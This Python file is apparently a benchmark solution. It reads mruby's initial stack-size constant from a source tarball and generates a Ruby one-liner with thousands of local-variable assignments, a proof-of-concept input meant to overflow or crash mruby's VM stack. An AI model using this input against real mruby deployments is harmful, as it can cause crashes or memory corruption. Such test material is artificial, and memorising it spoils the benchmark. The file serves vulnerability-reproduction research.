import os
import re
import tarfile
import ast
from typing import Optional, List


class Solution:
    def _safe_eval_int_expr(self, expr: str) -> Optional[int]:
        expr = expr.strip()
        expr = re.split(r'//|/\*', expr, maxsplit=1)[0].strip()
        if not expr:
            return None
        expr = re.sub(r'([0-9])([uUlL]+)\b', r'\1', expr)
        if not re.fullmatch(r'[\d\s\(\)\+\-\*\/%\<\>\&\|\^\~]+', expr):
            m = re.search(r'\d+', expr)
            return int(m.group(0)) if m else None

        try:
            node = ast.parse(expr, mode='eval')
        except Exception:
            m = re.search(r'\d+', expr)
            return int(m.group(0)) if m else None

        def _eval(n):
            if isinstance(n, ast.Expression):
                return _eval(n.body)
            if isinstance(n, ast.Constant) and isinstance(n.value, int):
                return int(n.value)
            if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
                v = _eval(n.operand)
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                return ~v
            if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor)):
                a = _eval(n.left)
                b = _eval(n.right)
                if isinstance(n.op, ast.Add):
                    return a + b
                if isinstance(n.op, ast.Sub):
                    return a - b
                if isinstance(n.op, ast.Mult):
                    return a * b
                if isinstance(n.op, (ast.Div, ast.FloorDiv)):
                    if b == 0:
                        return None
                    return a // b
                if isinstance(n.op, ast.Mod):
                    if b == 0:
                        return None
                    return a % b
                if isinstance(n.op, ast.LShift):
                    return a << b
                if isinstance(n.op, ast.RShift):
                    return a >> b
                if isinstance(n.op, ast.BitOr):
                    return a | b
                if isinstance(n.op, ast.BitAnd):
                    return a & b
                return a ^ b
            return None

        try:
            v = _eval(node)
            if isinstance(v, int):
                return v
        except Exception:
            return None
        return None

    def _find_stack_init_from_tar(self, tar_path: str) -> int:
        patterns = (
            re.compile(r'^\s*#\s*define\s+MRB_STACK_INIT_SIZE\s+(.+?)\s*(?:$|//|/\*)', re.M),
            re.compile(r'^\s*#\s*define\s+MRB_STACK_INIT\s+(.+?)\s*(?:$|//|/\*)', re.M),
            re.compile(r'^\s*#\s*define\s+MRB_STACK_INIT\s*\(\s*\)\s+(.+?)\s*(?:$|//|/\*)', re.M),
        )
        best = None
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    name = m.name
                    if not (name.endswith(".h") or name.endswith(".c") or name.endswith(".cpp") or name.endswith(".cc")):
                        continue
                    if ("include/" not in name) and ("src/" not in name) and ("mruby/" not in name):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    for pat in patterns:
                        for mm in pat.finditer(text):
                            expr = mm.group(1)
                            v = self._safe_eval_int_expr(expr)
                            if v is not None and v > 0:
                                if best is None or v > best:
                                    best = v
                    if best is not None and best >= 4096:
                        break
        except Exception:
            pass
        return int(best) if best is not None else 128

    def _enc62(self, n: int) -> str:
        alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        if n == 0:
            return "0"
        out = []
        while n:
            n, r = divmod(n, 62)
            out.append(alphabet[r])
        out.reverse()
        return "".join(out)

    def solve(self, src_path: str) -> bytes:
        init_sz = self._find_stack_init_from_tar(src_path)
        init_sz = max(1, int(init_sz))

        cap = max(12000, init_sz + 2048)
        nvars = max(1600, init_sz * 3)
        if nvars > cap:
            nvars = cap
        if nvars <= init_sz:
            nvars = init_sz + 256

        varnames: List[str] = [f"_{self._enc62(i)}" for i in range(nvars)]
        lhs = ",".join(varnames)
        code = f"def f;{lhs}=0;end;f\n"
        return code.encode("ascii", errors="ignore")